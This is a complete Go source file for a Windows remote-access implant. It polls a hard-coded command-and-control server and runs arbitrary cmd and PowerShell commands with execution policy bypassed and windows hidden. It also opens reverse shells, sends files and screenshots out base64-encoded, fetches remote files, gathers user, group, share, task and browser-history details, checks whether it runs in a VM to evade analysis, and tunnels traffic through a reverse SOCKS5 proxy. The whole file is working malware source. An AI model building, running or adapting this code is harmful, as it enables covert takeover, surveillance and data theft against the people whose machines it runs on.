package main

import (
    "bufio"
    "bytes"
    "crypto/tls"
    "encoding/base64"
    "encoding/json"
    "encoding/binary"
    "fmt"
    "github.com/kbinani/screenshot"
    "image/png"
    "io/ioutil"
    "log"
    "net"
    "net/http"
    "net/url"
    "os/exec"
    "os"
    "os/user"
    "path/filepath"
    "io"
    "strings"
    "sync"
    "syscall"
    "time"
    "github.com/StackExchange/wmi"
)

var (
    proxyActive   bool
    proxyStopChan chan struct{}
    proxyLock     sync.Mutex
)

var (
    mu               sync.Mutex
    isCommandRunning bool
    serverURL        = "http://192.168.56.101:5000"
    bearerToken      = "Azerty112345678"
)

type Command struct {
    ID  string `json:"id"`
    Cmd string `json:"cmd"`
}

type CommandResult struct {
    ID       string `json:"id"`
    Result   string `json:"result"`
    FileName string `json:"fileName,omitempty"`
}

func main() {
    log.Println("Agent started. Waiting for commands...")
    log.Println("Agent started. Checking VM status...")


        // Perform VM detection
        vmRes := DetectVM()


// Build detailed VM detection result
        vmResult := fmt.Sprintf(
                "VM Detection Results:\n"+
                "- Hypervisor Bit Set: %v\n"+
                "- BIOS Vendor Indicates VM: %v\n"+
                "- MAC Address Indicates VM: %v\n"+
                "- Timing Anomaly Detected: %v\n"+
                "- Registry Artifacts Found: %v\n"+
                "--------------------------------\n"+
                "Likely Running in VM: %v\n",
                vmRes.HypervisorBit,
                vmRes.BIOSVendorMatch,
                vmRes.MACOUI,
                vmRes.TimingAnomaly,
                vmRes.RegistryArtifacts,
                vmRes.LikelyVM,
        )

        sendResult(CommandResult{
                ID:     "vm_check",
                Result: vmResult,
        })


    ticker := time.NewTicker(10 * time.Second)

    go func() {
        for range ticker.C {
            mu.Lock()
            if !isCommandRunning {
                isCommandRunning = true
                mu.Unlock()

                cmd, err := fetchCommand()
                if err != nil {
                    log.Printf("Error fetching command: %v", err)
                    continue
                }
                if cmd.ID != "" {
                    executeCommandAndSendResult(cmd)
                }

                mu.Lock()
                isCommandRunning = false
            }
            mu.Unlock()
        }
    }()

    select {} // Prevent the application from exiting immediately.
}

func fetchCommand() (Command, error) {
    var cmd Command

    req, err := http.NewRequest("GET", fmt.Sprintf("%s/command", serverURL), nil)
    if err != nil {
        return cmd, err
    }

    // Add hard-coded Bearer token for authentication
    req.Header.Set("Authorization", "Bearer "+bearerToken)

    tr := &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // ⚠ For local testing only
    }
    client := &http.Client{
        Transport: tr,
        Timeout:   15 * time.Second,
    }
    resp, err := client.Do(req)
    if err != nil {
        return cmd, err
    }
    defer resp.Body.Close()

    if resp.StatusCode == http.StatusUnauthorized {
        log.Println("[-] Unauthorized: invalid or missing token")
        return cmd, nil
    }

    if resp.StatusCode != http.StatusOK {
        // No command available (404 or similar)
        return cmd, nil
    }

    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        return cmd, err
    }

    if err := json.Unmarshal(body, &cmd); err != nil {
        return cmd, err
    }

    return cmd, nil
}

func sendResult(result CommandResult) {
    jsonData, err := json.Marshal(result)
    if err != nil {
        log.Printf("Error marshalling result: %v", err)
        return
    }

    req, err := http.NewRequest("POST", fmt.Sprintf("%s/submit_result", serverURL), bytes.NewBuffer(jsonData))
    if err != nil {
        log.Printf("Failed to create HTTP request: %v", err)
        return
    }

    // Add hard-coded Bearer token for authentication
    req.Header.Set("Authorization", "Bearer "+bearerToken)
    req.Header.Set("Content-Type", "application/json")

    tr := &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    }
    client := &http.Client{
        Transport: tr,
        Timeout:   15 * time.Second,
    }
    resp, err := client.Do(req)
    if err != nil {
        log.Printf("Failed to send result: %v", err)
        return
    }
    defer resp.Body.Close()

    if resp.StatusCode == http.StatusUnauthorized {
        log.Println("[-] Unauthorized: invalid or missing token when sending result")
        return
    }

    if resp.StatusCode != http.StatusOK {
        body, _ := ioutil.ReadAll(resp.Body)
        log.Printf("Server returned status %s: %s", resp.Status, string(body))
    }
}


func executeCommandAndSendResult(cmd Command) {
    switch {
    case strings.HasPrefix(cmd.Cmd, "shell "):
        address := strings.TrimSpace(strings.TrimPrefix(cmd.Cmd, "shell"))
        Shell(address)
    case strings.HasPrefix(cmd.Cmd, "download "):
        tokens := strings.Split(cmd.Cmd, " ")
        if len(tokens) < 3 {
                sendResult(CommandResult{ID: cmd.ID, Result: "[-] Usage: download <source_path> <destination_name>"})
                return
        }

        // Recombine everything except the last token
        srcPath := strings.Join(tokens[1:len(tokens)-1], " ")
        dstName := tokens[len(tokens)-1]

        srcPath = strings.Trim(srcPath, "\"'")
        dstName = strings.Trim(dstName, "\"'")

        downloadFile(srcPath, dstName, cmd.ID)
    case cmd.Cmd == "screenshot":
        takeScreenshot(cmd)
    case cmd.Cmd == "list_share":
        listShare(cmd)
    case cmd.Cmd == "list_drive":
        listDrive(cmd)
    case cmd.Cmd == "whoami":
        whoami(cmd)
    case cmd.Cmd == "list_group":
            listGroup(cmd)
    case cmd.Cmd == "scheduled_task":
            listScheduledTask(cmd)
    case cmd.Cmd == "publicip":
            publicIp(cmd)
    case cmd.Cmd == "powershell":
           execPowerShellAndSendResult(cmd)
    case strings.HasPrefix(cmd.Cmd, "run_script "):
           scriptPath := strings.TrimSpace(strings.TrimPrefix(cmd.Cmd, "run_script"))
           runPowerShellScript(cmd, scriptPath)
    case strings.HasPrefix(cmd.Cmd, "fetchfile "):
        parts := strings.SplitN(cmd.Cmd[len("fetchfile "):], " ", 2)
        if len(parts) == 2 {
            fetchRemoteFile(parts[0], parts[1], cmd.ID)
        } else {
            log.Println("Fetchfile command format error. Expected 'fetchfile <url> <destination_path>'.")
            sendResult(CommandResult{
                ID:     cmd.ID,
                Result: "Usage: fetchfile <url> <destination_path>",
            })
        }
    case cmd.Cmd == "browser_history":
        checkBrowserHistories(cmd)
    case cmd.Cmd == "reverse_proxy_start":
         go startReverseProxy()
         sendResult(CommandResult{ID: cmd.ID, Result: "[+] Reverse proxy started."})
    case cmd.Cmd == "reverse_proxy_stop":
         stopReverseProxy()
         sendResult(CommandResult{ID: cmd.ID, Result: "[+] Reverse proxy stop signal sent."})
    default:
        executeOtherCommand(cmd)
    }
}

func Shell(address string) {
    conn, err := net.Dial("tcp", address)
    if err != nil {
        log.Printf("Failed to shell to %s: %v", address, err)
        return
    }
    defer conn.Close()

    for {
        reader := bufio.NewReader(conn)
        command, err := reader.ReadString('\n')
        if err != nil {
            log.Printf("Failed to read command: %v", err)
            break
        }

        cmd := exec.Command("cmd.exe", "/C", command)
        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
        output, err := cmd.CombinedOutput()
        if err != nil {
            fmt.Fprintf(conn, "Failed to execute command: %s\n", err)
            continue
        }

        conn.Write(output)
    }
}

func downloadFile(filePath, fileName, commandID string) {
    content, err := ioutil.ReadFile(filePath)
    if err != nil {
        log.Printf("Error reading file %s: %v", filePath, err)
        sendResult(CommandResult{ID: commandID, Result: fmt.Sprintf("Failed to read file: %v", err)})
        return
    }
    encodedContent := base64.StdEncoding.EncodeToString(content)
    sendResult(CommandResult{ID: commandID, Result: encodedContent, FileName: fileName})
}

func takeScreenshot(cmd Command) {
    bounds := screenshot.GetDisplayBounds(0)
    img, err := screenshot.CaptureRect(bounds)
    if err != nil {
        log.Printf("Failed to take screenshot: %v", err)
        sendResult(CommandResult{ID: cmd.ID, Result: "Failed to take screenshot"})
        return
    }
    var buf bytes.Buffer
    if err := png.Encode(&buf, img); err != nil {
        log.Printf("Failed to encode screenshot to PNG: %v", err)
        return
    }
    timestamp := time.Now().Format("20060102-150405")
    fileName := fmt.Sprintf("screenshot-%s.png", timestamp)
    sendResult(CommandResult{
        ID:       cmd.ID,
        Result:   base64.StdEncoding.EncodeToString(buf.Bytes()),
        FileName: fileName,
    })
}

func listShare(cmd Command) {
    psCommand := "powershell.exe Get-WmiObject Win32_Share"
    output, err := exec.Command("cmd", "/C", psCommand).CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }
    sendResult(CommandResult{
        ID:     cmd.ID,
        Result: resultText,
    })
}

func listDrive(cmd Command) {
    wmicCommand := "wmic logicaldisk get name,size"
    output, err := exec.Command("cmd", "/C", wmicCommand).CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }
    sendResult(CommandResult{
        ID:     cmd.ID,
        Result: resultText,
    })
}

func whoami(cmd Command) {
    wmicCommand := "whoami /all"
    output, err := exec.Command("cmd", "/C", wmicCommand).CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }
    sendResult(CommandResult{
        ID:     cmd.ID,
        Result: resultText,
    })
}

func listGroup(cmd Command) {
    wmicCommand := "net localgroup"
    output, err := exec.Command("cmd", "/C", wmicCommand).CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }
    sendResult(CommandResult{
        ID:     cmd.ID,
        Result: resultText,
    })
}


func listScheduledTask(cmd Command) {
    wmicCommand := "schtasks /query /fo LIST /v"
    output, err := exec.Command("cmd", "/C", wmicCommand).CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }
    sendResult(CommandResult{
        ID:     cmd.ID,
        Result: resultText,
    })
}

func publicIp(cmd Command) {
    resp, err := http.Get("https://ipinfo.io/ip")
    if err != nil {
        sendResult(CommandResult{
            ID:     cmd.ID,
            Result: fmt.Sprintf("Error fetching public IP: %v", err),
        })
        return
    }
    defer resp.Body.Close()

    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        sendResult(CommandResult{
            ID:     cmd.ID,
            Result: fmt.Sprintf("Error reading response: %v", err),
        })
        return
    }

    publicIP := strings.TrimSpace(string(body))
    sendResult(CommandResult{
        ID:     cmd.ID,
        Result: publicIP,
    })
}

func runPowerShellScript(cmd Command, scriptPath string) {
    // Always use -File to execute scripts, with safe defaults
    command := exec.Command("powershell.exe",
        "-NoProfile",
        "-ExecutionPolicy", "Bypass",
        "-File", scriptPath,
    )
    command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

    output, err := command.CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }

    sendResult(CommandResult{
        ID:     cmd.ID,
        Result: resultText,
    })
}

func execPowerShellAndSendResult(cmd Command) {
    // If the Cmd already includes "powershell", strip it off to avoid recursion
    psCmd := strings.TrimSpace(strings.TrimPrefix(strings.ToLower(cmd.Cmd), "powershell"))
    if psCmd == "" {
        psCmd = cmd.Cmd
    }

    command := exec.Command("powershell.exe",
        "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", psCmd)
    command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

    output, err := command.CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }

    sendResult(CommandResult{
        ID:     cmd.ID,
        Result: resultText,
    })
}

func fetchRemoteFile(url, destPath string, commandID string) {
    resp, err := http.Get(url)
    if err != nil {
        sendResult(CommandResult{
            ID:     commandID,
            Result: fmt.Sprintf("❌ Failed to fetch %s: %v", url, err),
        })
        return
    }
    defer resp.Body.Close()

    if resp.StatusCode != http.StatusOK {
        sendResult(CommandResult{
            ID:     commandID,
            Result: fmt.Sprintf("❌ Server returned: %s", resp.Status),
        })
        return
    }

    file, err := os.Create(destPath)
    if err != nil {
        sendResult(CommandResult{
            ID:     commandID,
            Result: fmt.Sprintf("❌ Failed to create %s: %v", destPath, err),
        })
        return
    }
    defer file.Close()

    _, err = io.Copy(file, resp.Body)
    if err != nil {
        sendResult(CommandResult{
            ID:     commandID,
            Result: fmt.Sprintf("❌ Failed to save file: %v", err),
        })
        return
    }

    sendResult(CommandResult{
        ID:     commandID,
        Result: fmt.Sprintf("✅ File successfully fetched to %s", destPath),
    })
}

func checkBrowserHistories(cmd Command) {
        browsers := []struct {
                Name string
                PathPatterns []string
        }{
                {
                        "Chrome",
                        []string{`AppData\Local\Google\Chrome\User Data\Default\History`},
                },
                {
                        "Edge",
                        []string{`AppData\Local\Microsoft\Edge\User Data\Default\History`},
                },
                {
                        "Brave",
                        []string{`AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History`},
                },
                {
                        "Firefox",
                        []string{`AppData\Roaming\Mozilla\Firefox\Profiles`},
                },
        }

        currentUser, err := user.Current()
        if err != nil {
                sendResult(CommandResult{
                        ID:     cmd.ID,
                        Result: "Failed to get current user: " + err.Error(),
                })
                return
        }

        var resultBuilder strings.Builder

        for _, browser := range browsers {
                found := false
                if browser.Name == "Firefox" {
                        // Handle Firefox's dynamic profile folder
                        basePath := filepath.Join(currentUser.HomeDir, browser.PathPatterns[0])
                        files, err := os.ReadDir(basePath)
                        if err == nil {
                                for _, f := range files {
                                        if f.IsDir() && strings.Contains(f.Name(), ".default") {
                                                histPath := filepath.Join(basePath, f.Name(), "places.sqlite")
                                                if _, err := os.Stat(histPath); err == nil {
                                                        resultBuilder.WriteString(fmt.Sprintf("Browser: %s\nInstalled: Yes\nHistory Path: %s\n---\n", browser.Name, histPath))
                                                        found = true
                                                        break
                                                }
                                        }
                                }
                        }
                } else {
                        for _, pattern := range browser.PathPatterns {
                                histPath := filepath.Join(currentUser.HomeDir, pattern)
                                if _, err := os.Stat(histPath); err == nil {
                                        resultBuilder.WriteString(fmt.Sprintf("Browser: %s\nInstalled: Yes\nHistory Path: %s\n---\n", browser.Name, histPath))
                                        found = true
                                        break
                                }
                        }
                }
                if !found {
                        resultBuilder.WriteString(fmt.Sprintf("Browser: %s\nInstalled: No or History Not Found\n---\n", browser.Name))
                }
        }

        sendResult(CommandResult{
                ID:     cmd.ID,
                Result: resultBuilder.String(),
        })
}


func executeOtherCommand(cmd Command) {
    output, err := exec.Command("cmd", "/C", cmd.Cmd).CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }
    sendResult(CommandResult{ID: cmd.ID, Result: resultText})
}
// --- VM Detection Logic (Windows only) ---


type VMCheckResult struct {
        HypervisorBit bool `json:"hypervisor_bit"`
        BIOSVendorMatch bool `json:"bios_vendor_match"`
        MACOUI bool `json:"mac_oui"`
        TimingAnomaly bool `json:"timing_anomaly"`
        RegistryArtifacts bool `json:"registry_artifacts"`
        LikelyVM bool `json:"likely_vm"`
}



func DetectVM() VMCheckResult {
        res := VMCheckResult{}
        res.HypervisorBit = false // not implemented
        res.BIOSVendorMatch = checkDmiStringsWMI()
        res.MACOUI = checkMACVendor()
        res.TimingAnomaly = checkTimingAnomaly()
        res.RegistryArtifacts = false


        count := 0
        if res.HypervisorBit {
                count++
        }
        if res.BIOSVendorMatch {
                count++
        }
        if res.MACOUI {
                count++
        }
        if res.TimingAnomaly {
                count++
        }
        if res.RegistryArtifacts {
                count++
        }


        res.LikelyVM = count >= 2
        return res
}

func checkDmiStringsWMI() bool {
        type Win32_ComputerSystem struct {
                Manufacturer string
                Model        string
        }

        var sysInfo []Win32_ComputerSystem
        err := wmi.Query("SELECT Manufacturer, Model FROM Win32_ComputerSystem", &sysInfo)
        if err != nil || len(sysInfo) == 0 {
                return false
        }

        known := []string{"VMware", "VirtualBox", "Xen", "QEMU", "Microsoft", "KVM"}
        man := strings.ToLower(sysInfo[0].Manufacturer)
        model := strings.ToLower(sysInfo[0].Model)
        for _, k := range known {
                if strings.Contains(man, strings.ToLower(k)) || strings.Contains(model, strings.ToLower(k)) {
                        return true
                }
        }
        return false
}

func checkMACVendor() bool {
        vmOuis := []string{
                "00:05:69", "00:0C:29", "00:50:56", "08:00:27", "52:54:00",
        }
        ifaces, err := net.Interfaces()
        if err != nil {
                return false
        }
        for _, iface := range ifaces {
                mac := iface.HardwareAddr.String()
                for _, prefix := range vmOuis {
                        if strings.HasPrefix(strings.ToUpper(mac), strings.ToUpper(prefix)) {
                                return true
                        }
                }
        }
        return false
}

func checkTimingAnomaly() bool {
        start := time.Now()
        for i := 0; i < 1000000; i++ {
                _ = i * i
        }
        duration := time.Since(start)
        return duration > 80*time.Millisecond
}

// startReverseProxy connects back to the C2 host (serverURL) on TCP:5555
// and behaves as a SOCKS5 proxy for proxychains-style clients.
// handleSOCKS5 implements a minimal SOCKS5 handshake + CONNECT command.
func handleSOCKS5(serverConn net.Conn) {
        buf := make([]byte, 262)

        // ---- Greeting ----
        n, err := io.ReadFull(serverConn, buf[:2])
        if err != nil || n < 2 {
                log.Printf("[-] SOCKS5 greeting read failed: %v", err)
                return
        }
        nMethods := int(buf[1])
        _, err = io.ReadFull(serverConn, buf[:nMethods]) // read methods
        if err != nil {
                log.Printf("[-] SOCKS5 methods read failed: %v", err)
                return
        }
        // reply: version 5, no authentication (0x00)
        serverConn.Write([]byte{0x05, 0x00})

        // ---- Request ----
        n, err = io.ReadFull(serverConn, buf[:4])
        if err != nil || n < 4 {
                log.Printf("[-] SOCKS5 request header failed: %v", err)
                return
        }
        cmd := buf[1]
        addrType := buf[3]
        if cmd != 0x01 { // only CONNECT
                serverConn.Write([]byte{0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
                return
        }

        var dstAddr string
        switch addrType {
        case 0x01: // IPv4
                _, err = io.ReadFull(serverConn, buf[:4])
                if err != nil {
                        return
                }
                ip := net.IPv4(buf[0], buf[1], buf[2], buf[3]).String()
                io.ReadFull(serverConn, buf[:2])
                port := binary.BigEndian.Uint16(buf[:2])
                dstAddr = fmt.Sprintf("%s:%d", ip, port)
        case 0x03: // Domain
                io.ReadFull(serverConn, buf[:1])
                dlen := int(buf[0])
                io.ReadFull(serverConn, buf[:dlen+2])
                domain := string(buf[:dlen])
                port := binary.BigEndian.Uint16(buf[dlen : dlen+2])
                dstAddr = fmt.Sprintf("%s:%d", domain, port)
        default:
                serverConn.Write([]byte{0x05, 0x08, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
                return
        }

        log.Printf("[*] SOCKS5 connect request → %s", dstAddr)
        targetConn, err := net.Dial("tcp", dstAddr)
        if err != nil {
                log.Printf("[-] Unable to connect to %s: %v", dstAddr, err)
                serverConn.Write([]byte{0x05, 0x05, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
                return
        }

        // success reply
        serverConn.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0})

        // ---- Relay traffic ----
        go io.Copy(targetConn, serverConn)
        io.Copy(serverConn, targetConn)
        targetConn.Close()
}

// startReverseProxy connects back to the C2 host (serverURL) and acts as a SOCKS5 bridge.
// It listens for a stop signal on proxyStopChan to end gracefully.
func startReverseProxy() {
    proxyLock.Lock()
    if proxyActive {
        log.Println("[!] Reverse proxy already active.")
        proxyLock.Unlock()
        return
    }
    proxyActive = true
    proxyStopChan = make(chan struct{})
    proxyLock.Unlock()

    parsed, err := url.Parse(serverURL)
    if err != nil {
        log.Printf("[-] reverse_proxy: cannot parse serverURL: %v", err)
        return
    }

    host := parsed.Host
    if strings.Contains(host, ":") {
        host = strings.Split(host, ":")[0]
    }
    remoteAddr := net.JoinHostPort(host, "5555")

    log.Printf("[*] reverse_proxy: connecting to %s ...", remoteAddr)
    conn, err := net.Dial("tcp", remoteAddr)
    if err != nil {
        log.Printf("[-] reverse_proxy: failed to connect: %v", err)
        proxyLock.Lock()
        proxyActive = false
        proxyLock.Unlock()
        return
    }
    log.Printf("[+] reverse_proxy: connected to %s", remoteAddr)

    // Handle SOCKS5 and traffic forwarding in a separate goroutine
    go handleSOCKS5(conn)

    // Monitor stop signal
    <-proxyStopChan
    log.Println("[*] reverse_proxy: stop signal received.")
    conn.Close()

    proxyLock.Lock()
    proxyActive = false
    proxyLock.Unlock()
    log.Println("[+] reverse_proxy: stopped.")
}

func stopReverseProxy() {
    proxyLock.Lock()
    defer proxyLock.Unlock()
    if proxyActive && proxyStopChan != nil {
        close(proxyStopChan)
    } else {
        log.Println("[-] reverse_proxy: not active.")
    }
}

